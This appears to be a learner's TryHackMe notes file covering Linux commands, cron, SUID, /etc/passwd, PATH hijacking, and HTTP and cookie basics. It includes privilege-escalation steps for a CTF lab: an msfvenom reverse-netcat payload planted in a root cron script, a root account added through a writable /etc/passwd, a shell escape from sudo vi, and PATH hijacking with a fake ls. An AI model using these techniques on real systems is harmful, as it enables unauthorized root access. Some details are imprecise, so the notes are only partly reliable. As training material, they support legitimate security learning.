# TryHackMe

## Linux Commands
```
ssh <user>@<host>	-> remotely accessing a machine !!! it's / @ \ between the two.
su	<user>			-> to change user on same machine

find <dir> -name <name> -type (f file, d dir, ...) 2>/dev/null (to avoid all non authorized access msges)
chmod 421-421-421 (for ex: chmod 760) for rights on read, write and exec.
chown 				-> changes the user and the group who the file belongs to (see with ls -la)
		example :	to set the owner of <file> to be 'master' : chown master file.
					to set owner and group to master : chown master:master file
curl				-> to download a file
	-O				keeps the original name
		example :	curl -O https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
hostname		: to know the host of the machine
cat /etc/passwd ( | grep user) : to know how many users of the machine there are
cat /etc/shells		: to know how many shells are currently running


```
### Cronjobs

The Cron daemon is a long-running process that executes commands at specific dates and times. We can use it to schedule activities (one-time or recurring).

Located in the spool directory (/var/spool/cron/crontabs). There are all the cronjobs for all users, except the root user 
stored in tables called crontabs

To display contents of the root user’s crontab, use the less command:

```crontab -l```	: to list all the cronjobs for the current user

```cat /etc/crontab```	: to view what cron jobs are scheduled
Cronjob's format : ID Minute Hour Day-of-month month Day-of-week user(what user the command will run as) Command
```
#  m   h dom mon dow user  command
17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
```
To exploit it : If a cronjob owned by root runs every few moments but the cronjob itself isn't protected, we can use it to run our own commands.
Let's create a PAYLOAD using MSFVENOM on our *host machine*.
```msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R```
Now we insert this payload into the autoscript file (which is running by the cronjob), we listen on our host machine using ```nc -lvp 8888```, wait for a few minutes and that's it, we're root !
But honestly, I didnt get the last parts using msfvenom and netcat.

### SUID/GUID

The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group.
An *SUID binary* any file has read/write/execute permissions for an user, a group and the other :
|user|group|others|
|rwx|rwx|rwx|
|421|421|421|
When special permission is given to each user it becomes SUID or SGID. When extra bit "4" is set to user(Owner), it becomes SUID (Set User ID) and when bit "2" is set to group it becomes SGID (Set Group ID).
SO we're looking for
```
SUID : rws-rwx-rwx
GUID : rwx-rws-rwx
```
To find SUID binaries : find / -perm -u=s -type f 2\>/dev/null
The  -u=s means any of the permission bits mode are set

### Understanding /etc/passwd

Plain text file containing a list of the system's account. It should have a READ perm for everybody, but a WRITE perm only for root.
```
test:x:0:0:root:/root/bin/bash
username:passwd:uid:gid:uid-info:homedir:command/shell
```
- *username*
- *password* encrypted in /etc/shadow file. Here it's the hash of the passwd.
- *User ID* each user has an UID. 0 is for roots and UIDS 1-99 for predefined accounts. 100-999 are reserved by system for admin and system accounts/groups.
- *GID* the primary groupd ID, stored in /etc/group file
- *User ID info* the comment field (with phone number, address...)
- *Home Dir* the absolute path to the directory the user will be in when they log in. If it doesn't exist, it becomes /
- *Command/Shell* the absolute path of a command or shell (/bin/bash)

If the file is writable, we can add an user ! to create a compliant password hash, we can use the salt "new" and the password "123"
```
openssl passwd -1 -salt [salt] [password]
```
To modify /etc/passwd, open it with vi/vim/nano and write on it. echo "..." didn't work, dk why.

### Escaping Vi Editor

*sudo -l* shows us that an user has root priv on vi. This can help us getting root !
We can use ```sudo vi```, then type ```:!sh``` and it's done, we're root :-)
## Linux Registers

## Linux PrivEsc - Privilege Escalation
![privEsc Tree](https://github.com/oghobhainn/TryHackMe/blob/main/images/privEscTree.png)
### LinEnum
Simple Bash script that performs common commands related to privEsc.
```
curl -O https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
```

### Exploiting PATH variable

The PATH variable specifies directories that hold executable programs.
If we have an SUID binary, we can re-write the PATH variable to a location of our choosing, so when the SUID binary calls the system shell to run an exec, it runs one that we've written instead. As with any SUID file, it will run this command with the same privileges as the owner of the SUID file ! If this is root, using this method we can run whatever commands we like as root!
For example, when we run the SUID binary, it seems like it runs the ```ls``` command. Then we go to /tmp, and create a script with the same name as the SUID, that will launch a bash (as root) ! ```echo "/bin/bash" > ls```.
Now if we want to use the real ls, we can do ```/bin/ls``` using the absolute path.
We need to change the PATH variable, so that it points to the dir where we have our imitation *ls* stored. ```export PATH=/tmp:```
Now running the script again, we gain a shell with root access ! we can therefor change back the PATH variable to ```export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH```
## Web Fondamentals

Once the browser knows the IP address (thanks to the DNS), it can ask for the web page using GET REQUEST (http verb). Extra resources like jss, images, css... get their own GET REQUEST.
HTTP runs on port 80 -> CTF: if port 80 is open, there's probably a website listening to you
HTTPS runs on port 443 (secured http connexion).

HTML defines the structure of the page
CSS allows you to change how the pages look
JavaScript is a programming language that runs in the browser and allows you to make pages interactive or load extra content.

### HTTP verbs

- *GET* to retrieve content. *curl* is a GET REQUEST		ex: curl http://10.10.82.69:8081/ctf/get
- *POST* to send data to a web server (adding a comment, performing a login)	ex: curl -X POST --data="flag_please" http://< IP >
- * *

#### HTTP Responses
- *100-199*: Information
- *200-299*: Successes (200 OK is the "normal" response for a GET)
- *300-399*: Redirects (the information you want is elsewhere)
- *400-499*: Client errors (You did something wrong, like asking for something that doesn't exist)
- *500-599*: Server errors (The server tried, but something went wrong on their side)

### COOKIES
Cookies are small bits of data that are stored in your browser. Each browser will store them separately, so cookies in Chrome won't be available in Firefox. They have a huge number of uses, but the most common are either session management or advertising (tracking cookies). Cookies are normally sent with every HTTP request made to a server.

Why Cookies ? Because HTTP is stateless (Each request is independent and no state is tracked internally).
Cookies can be broken down into several parts. Cookies have a name, a value, an expiry date and a path. The name identifies the cookie, the value is where data is stored, the expiry date is when the browser will get rid of the cookie automatically and the path determines what requests the cookie will be sent with.

#### Manipulating Cookies

Using your browser's developer tools, you can view and modify cookies. In Firefox, you can open the dev tools with F12. In the Storage tab, you can see cookies that the website has set. There's also a "+" button to allow you to create your own cookies. You can modify all cookies that you can see in this panel, as well as adding more.
- To get a cookie : curl http://< ip >:8081/ctf/getcookie -c cookielist.txt	(then check the cookielist file)
- To add a cookie : curl http://< ip >:8081/ctf/sendcookie --cookie < name > = < value >

## Networking

### Overview of the OSI - Open System Interconnection
OSI is a standardised model behind computer networking.
![OSI Model](https://github.com/oghobhainn/TryHackMe/blob/main/images/OSI_model.png)

But IRL we use the TCP/IP model, which is less understanbl but actually the same things happen.



## OpenVPN
